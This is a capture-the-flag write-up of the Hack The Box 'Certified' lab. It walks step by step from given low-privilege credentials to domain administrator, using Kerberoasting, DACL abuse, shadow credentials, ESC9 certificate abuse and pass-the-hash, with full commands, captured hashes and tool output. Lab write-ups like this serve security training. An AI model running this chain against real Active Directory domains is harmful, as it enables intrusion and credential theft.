## Intro

![](MediaFiles/Pasted%20image%2020250722012530.png)
Description:
```
As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09
```

[[windows]] [[AssumedBreach]] [[OSCPpath]] [[certificates]] [[shadowcredential]] [[certvulntoESC9]]
Tags: #windows #AssumedBreach #OSCPpath #certificates #shadowcredential #certvulntoESC9 
Tools used:
- enum4linux
- smbclient
- impacket's owneredit and dacledit  (DACL abuse)
- targetedKerberoast (kerberoasting)
- john (cracking)
- certipy (certificates handling)
----
# Reconnaissance

## Add target to /etc/hosts
```bash
sudo sh -c "echo '10.129.74.167 certified.htb' >> /etc/hosts"
```
## Nmap scan
```bash
sudo nmap -sC -sV certified.htb
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 13:48 CDT
Nmap scan report for certified.htb (10.129.74.167)
Host is up (0.075s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-22 01:49:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-07-22T01:50:27+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-22T01:50:28+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-22T01:50:27+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-07-22T01:50:28+00:00; +7h00m01s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-22T01:49:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.97 seconds
```

### Checking creds validity against services

lets now try to check to which service's we can connect with those creds, using my automated nxc script
https://github.com/ch3ckkm8/auto_netexec
```shell
./auto_netexec_bulk_creds_checker.sh certified.htb 'judith.mader' 'judith09'
```

```shell
WINRM       10.129.74.167   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.129.74.167   5985   DC01             [-] certified.htb\judith.mader:judith09

[*] Checking if smb port 445 is open on certified.htb...
[+] Port 445 open — checking smb with netexec
SMB         10.129.74.167   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.167   445    DC01             [+] certified.htb\judith.mader:judith09 

[*] Checking if ldap port 389 is open on certified.htb...
[+] Port 389 open — checking ldap with netexec
SMB         10.129.74.167   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.129.74.167   389    DC01             [+] certified.htb\judith.mader:judith09 

[*] Checking if rdp port 3389 is open on certified.htb...
[-] Skipping rdp — port 3389 is closed

[*] Checking if wmi port 135 is open on certified.htb...
[+] Port 135 open — checking wmi with netexec
RPC         10.129.74.167   135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
RPC         10.129.74.167   135    DC01             [+] certified.htb\judith.mader:judith09
```
what was observed here that with these creds we can login to:
- SMB
- LDAP
- RPC
lets try enumerating those and see what we can find

### Enumerating SMB

```shell
 enum4linux -a certified.htb
```
revealed nothing valuable, lets try smbclient

```shell
smbclient -L certified.htb -U judith.mader%judith09
```

```shell
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
```
only default shares here...inside found nothing interesting, lets try ldap

### Enumerating RPC

#### Anonymous login: 
```bash
rpcclient -U "" -N certified.htb
```
logged in but cant run commands, lets move on

#### Login as judith.mader
```shell
rpcclient -U 'judith.mader%judith09' certified.htb
```

```shell
enumdomains
```

```shell
rpcclient $> enumdomains
name:[CERTIFIED] idx:[0x0]
name:[Builtin] idx:[0x0]
```

```shell
enumdomusers
```

```shell
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```

```shell
enumdomgroups
```

```shell
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Management] rid:[0x450]
```
 Also we could use rcpdump:
```shell
rpcdump.py certified.htb/judith.mader:judith09@certified.htb
```
but found nothing of value

### Enumerating LDAP

Get naming context
```shell
ldapsearch -LLL -x -H ldap://certified.htb -s base namingcontexts 
```

```shell
dn:
namingcontexts: DC=certified,DC=htb
namingcontexts: CN=Configuration,DC=certified,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=certified,DC=htb
namingcontexts: DC=DomainDnsZones,DC=certified,DC=htb
namingcontexts: DC=ForestDnsZones,DC=certified,DC=htb
```

```shell
ldapsearch -LLL -x -H ldap://certified.htb -b "DC=certified,DC=htb" "objectclass=user" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt
```
not working, lets try this one
```shell
ldapdomaindump -u 'certified.htb\judith.mader' -p 'judith09' certified.htb
```
opening domain_users_by_group shows this
![](MediaFiles/Pasted%20image%2020250721221745.png)

#### Bloodhound as judith.mader

now we can also use bloodhound to get a visual representation too
```shell
sudo bloodhound-python -d certified.htb -u judith.mader -p judith09 -ns 10.129.74.167 -c All --zip
```

lets inspect `judith`'s outgoing access
![](MediaFiles/Pasted%20image%2020250721225320.png)
it appears she has `WriteOwner` rights towards `management` group, which has:
![](MediaFiles/Pasted%20image%2020250721225521.png)
and also the `management_svc` user :
![](MediaFiles/Pasted%20image%2020250721225611.png)
so the path seems obvious here, we will move from `judith` to `management svc` and then to `ca_operator`.

----
# Foothold


#### Kerberoasting attempt
```shell
python targetedKerberoast.py -u "judith.mader" -p "judith09" -d "certified.htb" --dc-ip 10.129.74.167
```

```shell
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$93fcc856e423a9aaac109e916e1893b0$e083479dbcbc6f576627c1ced06a5580e2fccea9b12ca376424ce83b7489008237d3db70b2760e3d14199387e35a80d831a389d699b1a89ef6579f255032b5ac97a6e70861ef69668de035ff2ff16a579a0425c3c2c35e25e138f7a4996aad984de3a63f3ee9e7fa0bad7593090057004e604380c21ff7971e0cfded214ebdf692bdfbfc3576cb0053f1e9a1b545ab12684c7df655436efdd4c73faf57f0bf7c55f92e6256ef3ca6bbcfd3681a58f98b53c79a01d2c6d8e972c58d7b8cc4e73e42bba30a2889137d6937be287a2527228edffd2d7b44c3e16f254258ce12e33304fea479a06437da260f3d0001118b1f55270b70828162662473aabbe499092539b693b0d50ba46996b6bd4ecd85b151c2e9d8dd1b97a8a53b615bbfdbe0751950654e044b2a828878293c9a2e99e03592dc42dca17533dfae5622bebe6c6b2f477f3e0a157592c111712c638f475fd6bebcedcd6f306f45045150c078c4cfeaf94b2523499835b4c94515886f89536189b0e9b31ca51ca065b58b5aa9291ba75a08ce503c16db708df471006a4de185a7a94805fa1d9acad9078dbe01b068ba3218523beab1452df6f3ae13a7c6fc9638414f146c541754fdc412e07885aac93280efa725f5d265e60f1e1422f7f6d1a9516672098b653754f5c2bab2f30a5b154b365ce8b960b863bcf02ab5886b9cd42abc85d248cebc5e0bf0c3ad4ef867e7c584bd378269f980a4c057c18b731e1a0a512485e03f4ccdd07456a262c64c0a6820fa4441ef204c82010925de6b60e53f62720f691c8c36d99b2ca4a9d786fcc429f63e4c61f6dc0be4319787109aeafba9a2224de4989a47e6260216411eb9d2dc29fe99ca2a9a86e79a5581094acb7d8c9b3d960985f80929ecbcc1b45d7ef4a17950e90da3847b9923fd4ef2df1942bd36ce424da27d8ce1200263ad8b365a5625dbef4b0e288cf296f8877dfcf661f192ba53cb1a726e274496514100b595cef9375c82985d91b2818eb6cee008835a7f9522224cd363e451da312a26c2be15ea207c32f21edd4d82f83387436ca7361730cbd5816a302c56680b0f89aef0ea36bfd4b9a6c05c2542bf37a78fe049a38136f9af509c8c968e8484c60e7ad0b1e30cf8e50dfcb200d3916f46f2ac35c6ee96b4a7f894494abea1089a24cae89dbf919f6e707a9d465df6ace659626bf424808e29f552468fa68afc10872ed59f89eabd0b1cc3176be70c83a5c11f991b44c59a20ba6e48b8877f1cc3e8f3644bf57b471b1b5a79b80b1e2cc5cb8d13e7c036a07586948a58c8766c1967c626161d48d7e60f571a43a947c5866ba4954e02050131d19635c37e89583611a00124c1b0b7d60dc629b5e2d21e833bf490c08f2268da6a89212a66875ae7f88779fa0207b649a629f700ffdaf5fd4cc12435f2a11ef8d32a419d46163718d64a12ede58eadcf7b8a27df92e419c77b992d62e9a5aefe0b84b29ea62d01203356a83d882dacd707449df77dbccff0a7848218755f04c40107750fe6b38844b15bdf992db78c85293140bc4ddaeeba6075bb1816df4265b8009a680e09153a3ce1a9
```

```shell
john certified_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```shell
!!12Honey..*7¡Vamos!
```
hm sth is wrong thats not a valid password. The hash does not appear crackable..

## Set judith as owner of management group
```
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```

## Add `judith.mader` as member of the `Management` group.
give judith rights first
```
sudo dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```
then add here in `management` group
```
sudo net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.74.167"
```

#### Exploiting `GenericWrite` 
##### Shadow credential

```shell
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.74.167
```

```shell
[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '72b3ae50-d259-f584-f9b1-ef6a616354ad'
[*] Adding Key Credential with device ID '72b3ae50-d259-f584-f9b1-ef6a616354ad' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '72b3ae50-d259-f584-f9b1-ef6a616354ad' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
great! we can now try logging in via win-rm with this hash
```shell
evil-winrm -i 10.129.74.167 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
```
user flag found
```shell
333af37536b3b5a3c1536455da59d5e4
```
![](MediaFiles/Pasted%20image%2020250722004143.png)

----
# Privesc

Lets try to find vulnerable certs 
```shell
certipy find -vulnerable -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.74.167 -stdout
```
no luck...
![](MediaFiles/Pasted%20image%2020250722005003.png)
what now? well remember management_svc user has `GenericAll` over CA_OPERATOR

Since we have `GenericAll` over the ca_operator ,using the same method as before, via shadow creds

## Shadow credential

Shadow credential is like adding a **backdoor key** to accounts. Uses `msDS-KeyCredentialLink` account attribute
```shell
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.129.74.167
```

```shell
[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '725189f8-7631-0bc1-b0e2-6817a104f8cf'
[*] Adding Key Credential with device ID '725189f8-7631-0bc1-b0e2-6817a104f8cf' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '725189f8-7631-0bc1-b0e2-6817a104f8cf' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
we now have the hash of ca_operator!

hm trying to login with win-rm is not succesful...

### Enumerate ADCS

#### Vulnerable certificates 

But wait a minute, last time we searched for vulnerable certs, we were `management_svc`, now we are `ca_operator`, we could try again:
```shell
certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.74.167 -stdout
```
![](MediaFiles/Pasted%20image%2020250722005612.png)
nice! we just identified that its vulnerable to `ESC9` 

#### 1. Change userprincipalname of  `ca_operator` to Administrator

for this, we exploit the `GenericAll` rights of `management_svc` hash over `ca_operator`
```shell
certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.74.167
```
#### 2. Request certificate  
```shell
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.74.167
```
#### 3. Revert the UPN back to original
```shell
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.74.167
```
#### 4. Get admin's hash
```shell
certipy auth -pfx administrator.pfx -dc-ip 10.129.74.167 -domain certified.htb
```

```shell
[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
great, we now have admin's hash `0d5b49608bbce1751f708748f67e2d34`

## Logging in as administrator

```shell
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```
grabbed root flag
```shell
a84f063e9751db03fcf05abb6673dcee
```
![](MediaFiles/Pasted%20image%2020250722012316.png)

----
# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

## Reconnaissance
1. nmap scan -> multiple ports indicating DC presence
2. As its an assumed breach scenario, ==checked creds agains services== and found them valid towards ==SMB==, ==LDAP==, ==RPC==
3. Enumerated ==SMB== and ==RPC== with no findings
4. Enumeration of ==LDAP== via Bloodhound revealed compromised user's `DACL`
5. Compromised user (judith.mader) has `WriteOwner` on Group `management`
6. `management` group has `GenericWrite` over user `management_svc`
7. `management_svc` has `GenericAll` over `ca_operator`
## Foothold
8. Abused DACL according to the previous 3 steps
9. Exploited `GenericWrite` via ==Shadow credential==, revealed NT hash for `management_svc`
10. Logged in as `management_svc` and grabbed user flag
## Privesc
1. Enumerated `ADCS`, found it vulnerable to ==ESC9==
2. Exploited ==ESC9==, got admin hash
3. Logged in as `Administrator` and grabbed root flag

----

# Sidenotes

A solid assumed bread scenario overall, i could say it was mostly straightforward. What i will keep from this this one would be mostly the `ESC9` exploitation and overall the methodology and tools used.  

![](MediaFiles/Pasted%20image%2020260127214936.png)
